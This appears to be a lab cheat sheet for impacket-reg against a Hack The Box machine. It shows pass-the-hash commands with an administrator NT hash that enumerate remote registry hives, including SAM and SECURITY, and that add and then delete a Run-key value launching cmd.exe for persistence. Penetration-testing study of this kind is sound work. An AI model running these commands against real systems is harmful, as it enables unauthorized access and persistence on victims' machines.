## query
### query -keyName KEYNAME
```sh
└─$ impacket-reg -debug -hashes ':32693b11e6aa90eb43d32c72a07ceea6' 'htb.local/administrator@10.129.25.235' query -keyName HKCR
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] Service RemoteRegistry is already running
HKCR
HKCR\*
HKCR\.386
HKCR\.a
HKCR\.accountpicture-ms
HKCR\.aif

~~~


└─$ impacket-reg -debug -hashes ':32693b11e6aa90eb43d32c72a07ceea6' 'htb.local/administrator@10.129.25.235' query -keyName HKCU
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] Service RemoteRegistry is already running
HKCU
HKCU\Control Panel
HKCU\Environment
HKCU\Keyboard Layout
HKCU\Software


└─$ impacket-reg -debug -hashes ':32693b11e6aa90eb43d32c72a07ceea6' 'htb.local/administrator@10.129.25.235' query -keyName HKLM
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] Service RemoteRegistry is already running
HKLM
HKLM\BCD00000000
HKLM\HARDWARE
HKLM\SAM
HKLM\SECURITY
HKLM\SOFTWARE
HKLM\SYSTEM


└─$ impacket-reg -debug -hashes ':32693b11e6aa90eb43d32c72a07ceea6' 'htb.local/administrator@10.129.25.235' query -keyName HKU 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] Service RemoteRegistry is already running
HKU
HKU\.DEFAULT
HKU\S-1-5-19
HKU\S-1-5-20
HKU\S-1-5-18
```
### query -keyName KEYNAME -v VALUENAME
```sh
└─$ impacket-reg -debug -hashes ':32693b11e6aa90eb43d32c72a07ceea6' 'htb.local/administrator@10.129.25.235' query -keyName 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' -v 'VMware User Process' 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] Service RemoteRegistry is already running
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
        VMware User Process     REG_SZ   "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
```
### query -keyName KEYNAME -s
```sh
└─$ impacket-reg -debug -hashes ':32693b11e6aa90eb43d32c72a07ceea6' 'htb.local/administrator@10.129.25.235' query -keyName 'HKLM\Software\Microsoft\Windows\CurrentVersion' -s                           
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] Service RemoteRegistry is already running
Software\Microsoft\Windows\CurrentVersion\AccountPicture\
Software\Microsoft\Windows\CurrentVersion\AccountPicture\Users\
Software\Microsoft\Windows\CurrentVersion\AdminDebug\
Software\Microsoft\Windows\CurrentVersion\AdminDebug\dcpromoui\
        LogFlags        REG_DWORD        0x1007c
Software\Microsoft\Windows\CurrentVersion\App Management\
Software\Microsoft\Windows\CurrentVersion\App Management\Publishers\
Software\Microsoft\Windows\CurrentVersion\App Management\Publishers\WSUS Publisher\
        (Default)       REG_SZ   {85074451-173D-4091-8648-C0E196BB363E}

~~~
```


## add
VALUETYPE are: REG_NONE, REG_SZ, REG_EXPAND_SZ, REG_BINARY, REG_DWORD, REG_DWORD_BIG_ENDIAN, REG_LINK, REG_MULTI_SZ, REG_QWORD
```sh
└─$ impacket-reg -debug -hashes ':32693b11e6aa90eb43d32c72a07ceea6' 'htb.local/administrator@10.129.25.235' add -keyName 'HKLM\Software\Microsoft\Windows\CurrentVersion\RUN' -v 'test' -vt 'REG_SZ' -vd 'C:\Windows\System32\cmd.exe' 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] Service RemoteRegistry is already running
Successfully set
        key     HKLM\Software\Microsoft\Windows\CurrentVersion\RUN\test
        type    REG_SZ
        value   C:\Windows\System32\cmd.exe
```


## delete
```sh
└─$ impacket-reg -debug -hashes ':32693b11e6aa90eb43d32c72a07ceea6' 'htb.local/administrator@10.129.25.235' delete -keyName 'HKLM\Software\Microsoft\Windows\CurrentVersion\RUN' -v 'test'                                         
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] Service RemoteRegistry is already running
Successfully deleted key HKLM\Software\Microsoft\Windows\CurrentVersion\RUN\test
```
